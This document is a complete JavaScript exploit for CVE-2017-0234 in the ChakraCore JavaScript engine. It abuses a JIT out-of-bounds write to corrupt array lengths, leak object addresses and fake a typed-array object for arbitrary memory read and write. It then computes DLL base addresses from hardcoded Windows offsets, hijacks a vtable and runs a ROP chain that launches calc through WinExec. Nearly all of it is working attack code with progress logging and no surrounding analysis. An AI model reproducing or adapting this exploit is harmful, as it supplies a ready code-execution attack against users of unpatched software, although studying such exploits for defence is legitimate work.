var buffer = new ArrayBuffer(0x10000);
var view = new Uint32Array(buffer);
var buffer_uint = new ArrayBuffer(0x100);
var uint32= new Uint32Array(buffer_uint);

function write(begin, end, step, num) {
    for (var i = begin; i < end; i += step) view[i] = num;
}

//-------------------------------------------------
//Step1: create arr1&arr2 and hit

//Most of the time,i will be 0 or arr1 not hit
//but this cycle can trigger JIT
for(var i=0;i<0x800;i+=1)
{
	var arr1=new Array(0x800);
	arr1[0]=0;
	for(var j=0;j<0x1000;j+=1)
	{
		write(0x40000000+0xe,0x40000000+0xf,1,0x12345678);
	}
		if(arr1[0]==0x12345678)//check whether arr1 successed in hitting memory 
		{
			arr2=new Array(0x800);
			arr1.length=0xffffff00;//important for fakeview 
			write(0x40000000+0x09,0x40000000+0x001000,0x100000,0xf0000);//JIT OOB hijack length and size of arr1
			write(0x40000000+0x0a,0x40000000+0x001000,0x100000,0xf0000);//Now arr1 can OOB read&write arr2
			break;
		}
}
if(arr2==undefined){
	console.log("[INFO][cve-2017-0234_no-cfg_Exploit]>> JIT OOB defeat!")
	exit();
}

console.log("[INFO][cve-2017-0234_no-cfg_Exploit]>> Exp Step1...")
console.log("[INFO][cve-2017-0234_no-cfg_Exploit]>> arr1&2 hit success!")


//now you can leak any object
function getobjadd(myobj)
{
	arr2[3]=myobj;
	uint32[0]=arr1[0xc06];//int to uint
	return (arr1[0xc07])*0x100000000+uint32[0];
}




//-------------------------------------------------
//Step2: fake object
var buffer1 = new ArrayBuffer(0x100);
var view1 = new Uint32Array(buffer1);
var view2 = new Uint32Array(buffer1);
var view3 = new Uint32Array(buffer1);
var view4 = new Uint32Array(buffer1);
var myview=new Uint32Array();

arr2[0]=buffer1;//for leak low 4Byte of buffer1
arr2[1]=view2;
arr2[2]=0;//make chakra think it's not undefined and hijack it
for(var j=0;j<0x1000;j+=1){
	write(0x40000000+0x00000d,0x40000000+0x001000,0x100000,arr1[0xc03]);
	write(0x40000000+0x00000c,0x40000000+0x001000,0x100000,arr1[0xc02]+0x28);//write view2+0x28 to segment.next of arr1
}
uint32[0]=arr1[0xc00];//leak low 4Byte of buffer1 and int to uint
index=uint32[0];
for(var i=0;i<0x10;i++) {
	view4[i]=arr1[index+i];//Copy data of view object for faking
}
if(view1[0xe]>0x7fffffff){//int to uint
	var buma=new Int32Array(0x10);
	buma[0]=view4[0xe];
	arr1[0xc04]=buma[0];
}
else{
	arr1[0xc04]=view4[0xe];
}

arr1[0xc05]=view4[0xf];
myview=arr2[2];//Now we have a fake object and can hijack its buffer
console.log("[INFO][cve-2017-0234_no-cfg_Exploit]>> Exp Step2...")
console.log("[INFO][cve-2017-0234_no-cfg_Exploit]>> Create fake object successfully!")
//now we can write/read anything anywhere
function readuint32(address)
{
	view4[0x0e]=address%0x100000000;
	view4[0x0f]=address/0x100000000;
	return myview[0];
}

function writeuint32(address,num)
{
	view4[0x0e]=address%0x100000000;
	view4[0x0f]=address/0x100000000;
	myview[0]=num;
}
function readuint64(address)
{
	view4[0x0e]=address%0x100000000;
	view4[0x0f]=address/0x100000000;
	var a=myview[0];
	view4[0x0e]=(address+4)%0x100000000;
	view4[0x0f]=(address+4)/0x100000000;
	return myview[0]*0x100000000+a;
}



function writeuint64(address,num)
{
	var tmp=num%0x100000000
	writeuint32(address,tmp)
	writeuint32(address+4,(num-tmp)/0x100000000)

}


//the offest on 1903 18362.959
offest_chakra_release=0x7ff9a76682a8-0x7ff9a7070000
offest_kernel32_release=0x7ffa25c96a50-0x7ffa25c80000
offest_ntdll_release=0x7ffa26bca640-0x7ffa26bc0000
vtable_offest=0x9c8-0x870

var arr1_addr=getobjadd(arr1);//the addr of arr1's vtable ptr
chakracore=readuint64(arr1_addr)-offest_chakra_release
kernel32=readuint64(chakracore+0x57b048)-offest_kernel32_release
ntdll=readuint64(chakracore+0x57b000)-offest_ntdll_release
rcx=ntdll+0x8ea7b //pop rcx;
rdx_2=ntdll+0x8c437  //pop rdx;pop xxx;
winexec=0xae800-0x50000+kernel32
r11_to_rsp=ntdll+0x3016a  //mov rsp, r11;

baby = new Array(0x2000);
baby_addr=getobjadd(baby)

//ROP chain
//WinExec("calc",1)
writeuint64(arr1_addr,arr1_addr+0x200-0x10);  //hijack vtable ptr of arr1
writeuint64(arr1_addr+0x200-0x10+vtable_offest,r11_to_rsp); 
writeuint64(baby_addr+8,rcx);
writeuint64(baby_addr+0x10,baby_addr+0x38);
writeuint64(baby_addr+0x18,rdx_2);
writeuint64(baby_addr+0x20,1);
writeuint64(baby_addr+0x28,1);
writeuint64(baby_addr+0x30,winexec);
writeuint64(baby_addr+0x38,0x636c6163);

console.log("[INFO][cve-2017-0234_no-cfg_Exploit]>> Exp Step3...")
console.log("[INFO][cve-2017-0234_no-cfg_Exploit]>> Start stack pivoting and ROP!")
console.log("[INFO][cve-2017-0234_no-cfg_Exploit]>> If failed,check the gadgets offests of your ntdll and kernel32.dll")
console.log("[INFO][cve-2017-0234_no-cfg_Exploit]>> Exploit!")
//exploit!
arr1==baby;


// delay 1000 = 1s
function sleep(delay) {
    var start = new Date().getTime();
    while (new Date().getTime() < start + delay)
        ;
}
//16 to 0x10
function dtoh(dec)
{
	var a="0x"+dec.toString(16)
	return a;
}